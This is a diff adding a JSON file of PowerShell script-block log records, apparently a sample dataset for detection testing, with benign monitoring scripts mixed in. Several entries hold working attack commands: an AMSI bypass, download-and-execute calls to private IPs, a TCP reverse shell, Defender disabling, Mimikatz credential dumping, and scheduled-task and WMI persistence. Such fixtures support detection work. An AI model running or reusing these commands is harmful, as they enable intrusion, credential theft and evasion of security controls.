@@ -1,0 +1,156 @@
+[
+  {
+    "ScriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+    "Computer": "VICTIM-PC-01",
+    "ProcessId": 7832,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:22:00Z",
+    "ScriptBlockId": "aaaaaaaa-0001-0001-0001-000000000001",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": ""
+  },
+  {
+    "ScriptBlockText": "(New-Object Net.WebClient).DownloadString('http://192.168.45.100/stage2.ps1') | IEX",
+    "Computer": "VICTIM-PC-01",
+    "ProcessId": 7832,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:22:04Z",
+    "ScriptBlockId": "aaaaaaaa-0001-0001-0001-000000000002",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": ""
+  },
+  {
+    "ScriptBlockText": "$DoIt = @\"\nfunction func_get_proc_address {\n  Param ($mod, $func)\n  $unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n  $gpa = $unsafe_native_methods.GetMethod('GetProcAddress')\n  return $gpa.Invoke($null,@([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null,@($mod)))),$func))\n}\n\"@\n$DoIt | IEX\n$buf = [System.IO.Compression.GzipStream]::new([System.IO.MemoryStream]::new([Convert]::FromBase64String('H4sIAAAAAAAEA'+'KtWKkktLlGyUlIqS'+'y0uTgUAAA==')), [System.IO.Compression.CompressionMode]::Decompress)",
+    "Computer": "VICTIM-PC-01",
+    "ProcessId": 7832,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:22:09Z",
+    "ScriptBlockId": "aaaaaaaa-0001-0001-0001-000000000003",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": ""
+  },
+  {
+    "ScriptBlockText": "$client = New-Object System.Net.Sockets.TcpClient('192.168.45.100',4444);\n$stream = $client.GetStream();\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){\n  $data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);\n  $sendback=(iex $data 2>&1|Out-String);\n  $sendback2=$sendback+'PS '+(pwd).Path+'> ';\n  $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);\n  $stream.Write($sendbyte,0,$sendbyte.Length);\n  $stream.Flush()\n}",
+    "Computer": "VICTIM-PC-01",
+    "ProcessId": 7832,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:22:12Z",
+    "ScriptBlockId": "aaaaaaaa-0001-0001-0001-000000000004",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": ""
+  },
+  {
+    "ScriptBlockText": "Set-MpPreference -DisableRealtimeMonitoring $true;\nAdd-MpPreference -ExclusionPath 'C:\\Users\\Public';\nAdd-MpPreference -ExclusionPath 'C:\\Windows\\Temp'",
+    "Computer": "VICTIM-PC-02",
+    "ProcessId": 9120,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:25:00Z",
+    "ScriptBlockId": "bbbbbbbb-0002-0002-0002-000000000001",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": ""
+  },
+  {
+    "ScriptBlockText": "Invoke-Mimikatz -DumpCreds;\nsekurlsa::logonpasswords;\nlsadump::sam",
+    "Computer": "VICTIM-PC-02",
+    "ProcessId": 9120,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:25:20Z",
+    "ScriptBlockId": "bbbbbbbb-0002-0002-0002-000000000002",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": ""
+  },
+  {
+    "ScriptBlockText": "Register-ScheduledTask -TaskName 'WindowsUpdate' -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAMAAwAC8AcABlAHIAcwBpAHMAdAAuAHAAcwAxACcAKQB8AEkARQBYAA==') -Trigger (New-ScheduledTaskTrigger -AtStartup) -RunLevel Highest -Force",
+    "Computer": "VICTIM-PC-02",
+    "ProcessId": 9120,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:25:45Z",
+    "ScriptBlockId": "bbbbbbbb-0002-0002-0002-000000000003",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": ""
+  },
+  {
+    "ScriptBlockText": "Set-WmiInstance -Class __EventFilter -NameSpace 'root\\subscription' -Arguments @{Name='PersistFilter';EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'}",
+    "Computer": "VICTIM-PC-02",
+    "ProcessId": 9120,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:26:10Z",
+    "ScriptBlockId": "bbbbbbbb-0002-0002-0002-000000000004",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": ""
+  },
+  {
+    "ScriptBlockText": "po`wer`sh`ell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA;\n[char]73+[char]69+[char]88+[char]32+[char]40+[char]78;\n$j = ('{0}{2}{1}' -f 'am','InitFailed','si')",
+    "Computer": "VICTIM-PC-03",
+    "ProcessId": 5566,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:28:00Z",
+    "ScriptBlockId": "cccccccc-0003-0003-0003-000000000001",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": ""
+  },
+  {
+    "ScriptBlockText": "('N','e','t','.','W','e','b','C','l','i','e','n','t') -join '' | IEX;\n(New-Object Net.WebClient).DownloadString('http://10.10.10.50/beacon.ps1') | IEX",
+    "Computer": "VICTIM-PC-03",
+    "ProcessId": 5566,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:28:08Z",
+    "ScriptBlockId": "cccccccc-0003-0003-0003-000000000002",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": ""
+  },
+  {
+    "ScriptBlockText": "Import-Module ActiveDirectory;\nGet-ADUser -Filter * -Properties * | Select-Object Name,SamAccountName,EmailAddress,Enabled | Export-Csv C:\\Users\\Public\\ad_users.csv -NoTypeInformation;\nGet-ADComputer -Filter * | Select-Object Name,DNSHostName,OperatingSystem | Export-Csv C:\\Users\\Public\\ad_computers.csv -NoTypeInformation",
+    "Computer": "DC-01",
+    "ProcessId": 3812,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:30:00Z",
+    "ScriptBlockId": "dddddddd-0004-0004-0004-000000000001",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": ""
+  },
+  {
+    "ScriptBlockText": "Get-Process | Where-Object { $_.CPU -gt 10 } | Sort-Object CPU -Descending | Select-Object -First 20",
+    "Computer": "WORKSTATION-05",
+    "ProcessId": 1100,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:15:00Z",
+    "ScriptBlockId": "eeeeeeee-0005-0005-0005-000000000001",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": "C:\\Scripts\\monitoring\\check_cpu.ps1"
+  },
+  {
+    "ScriptBlockText": "function Get-SystemHealth {\n  $cpu = (Get-WmiObject Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average\n  $mem = (Get-WmiObject Win32_OperatingSystem | Select-Object FreePhysicalMemory,TotalVisibleMemorySize)\n  $disk = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 }\n  [PSCustomObject]@{ CPU=$cpu; FreeMemMB=[math]::Round($mem.FreePhysicalMemory/1024); TotalMemMB=[math]::Round($mem.TotalVisibleMemorySize/1024) }\n}\nGet-SystemHealth | ConvertTo-Json",
+    "Computer": "WORKSTATION-05",
+    "ProcessId": 1100,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:15:05Z",
+    "ScriptBlockId": "eeeeeeee-0005-0005-0005-000000000002",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": "C:\\Scripts\\monitoring\\check_cpu.ps1"
+  },
+  {
+    "ScriptBlockText": "$ErrorActionPreference = 'Stop'\ntry {\n  $result = Invoke-WebRequest -Uri 'https://internal.corp/api/health' -UseDefaultCredentials -TimeoutSec 10\n  Write-Host \"Health check passed: $($result.StatusCode)\"\n} catch {\n  Write-Error \"Health check failed: $_\"\n  exit 1\n}",
+    "Computer": "WORKSTATION-05",
+    "ProcessId": 1100,
+    "ThreadId": 1,
+    "TimeCreated": "2024-06-01T14:15:08Z",
+    "ScriptBlockId": "eeeeeeee-0005-0005-0005-000000000003",
+    "MessageNumber": 1,
+    "MessageTotal": 1,
+    "Path": "C:\\Scripts\\monitoring\\check_cpu.ps1"
+  }
+]
